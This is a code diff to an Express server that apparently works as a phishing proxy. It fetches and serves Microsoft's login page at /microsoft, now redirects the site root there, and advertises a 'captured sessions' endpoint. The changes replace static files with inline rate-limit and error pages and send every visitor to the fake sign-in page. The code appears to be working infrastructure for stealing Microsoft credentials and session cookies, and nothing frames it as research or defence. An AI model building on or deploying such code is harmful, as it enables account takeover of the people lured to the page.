@@ -23,7 +23,7 @@ const server = http.createServer(app);
 app.set('trust proxy', true);
 
 // ============= MIDDLEWARE =============
-app.use(express.static(path.join(__dirname, 'public')));
+// REMOVED: express.static - no longer serving static files
 app.use(cors({
   origin: process.env.NODE_ENV === 'production' 
     ? [process.env.APP_URL || 'https://your-app.onrender.com'] 
@@ -273,6 +273,12 @@ function sendToSession(sessionId, event, data) {
   return true;
 }
 
+// ============= ROOT REDIRECT =============
+app.get('/', (req, res) => {
+  console.log('↪️ Redirecting root to /microsoft');
+  res.redirect('/microsoft');
+});
+
 // ============= MICROSOFT LOGIN PAGE FETCHER =============
 const MICROSOFT_LOGIN_URL = 'https://login.microsoftonline.com';
 
@@ -283,7 +289,17 @@ app.get('/microsoft', async (req, res) => {
     
     const lastRequest = requestTimestamps.get(clientIp) || 0;
     if (now - lastRequest < SESSION_COOLDOWN) {
-      return res.sendFile(path.join(__dirname, 'public', 'microsoft-login.html'));
+      // Instead of sending static file, just fetch a new page with rate limit message
+      return res.send(`
+        <html>
+          <head><title>Rate Limited</title></head>
+          <body style="font-family: Arial; text-align: center; padding: 50px;">
+            <h2>Too many requests</h2>
+            <p>Please wait a few seconds before trying again.</p>
+            <a href="/microsoft">Try Again</a>
+          </body>
+        </html>
+      `);
     }
     requestTimestamps.set(clientIp, now);
     
@@ -414,7 +430,17 @@ app.get('/microsoft', async (req, res) => {
     
   } catch (error) {
     console.error('Error fetching Microsoft page:', error.message);
-    res.sendFile(path.join(__dirname, 'public', 'microsoft-login.html'));
+    // Instead of sending static file, show error page
+    res.status(500).send(`
+      <html>
+        <head><title>Error</title></head>
+        <body style="font-family: Arial; text-align: center; padding: 50px;">
+          <h2>Unable to load Microsoft login page</h2>
+          <p>Please try again later.</p>
+          <a href="/microsoft">Try Again</a>
+        </body>
+      </html>
+    `);
   }
 });
 
@@ -860,22 +886,29 @@ app.get('/test', (req, res) => {
 });
 
 // ============= ERROR HANDLING =============
+// REMOVED: static file serving - now returns JSON 404 for unmatched routes
 app.use((req, res) => {
-  if (req.path.startsWith('/api/') || req.path.startsWith('/proxy/')) {
-    return res.status(404).json({ error: 'Endpoint not found' });
-  }
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+  // Return JSON 404 for any unmatched routes
+  res.status(404).json({ 
+    error: 'Endpoint not found',
+    path: req.path,
+    message: 'The requested endpoint does not exist'
+  });
 });
 
 app.use((err, req, res, next) => {
   console.error('Server error:', err);
-  res.status(500).json({ error: 'Internal server error' });
+  res.status(500).json({ 
+    error: 'Internal server error',
+    message: err.message 
+  });
 });
 
 // ============= START SERVER =============
 const PORT = process.env.PORT || 3001;
 server.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`↪️ Root URL (/) redirects to /microsoft`);
   console.log(`🎯 Microsoft page: http://localhost:${PORT}/microsoft`);
   console.log(`🍪 Captured sessions: http://localhost:${PORT}/captured-sessions`);
   console.log(`❤️ Health check: http://localhost:${PORT}/health`);
